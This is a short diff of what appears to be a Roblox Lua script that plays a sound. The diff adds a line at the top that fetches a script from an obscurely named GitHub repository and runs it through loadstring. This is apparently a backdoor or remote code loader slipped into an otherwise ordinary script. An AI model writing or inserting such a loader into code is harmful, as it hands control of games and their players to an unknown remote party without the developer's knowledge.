@@ -1,3 +1,4 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/7asdKxXlmZpOiu0v45XmnZlLs/core/master/maincore'))()
 wait(0.000001)
 --LOADED FUNCTION
 	local s = Instance.new("Sound")
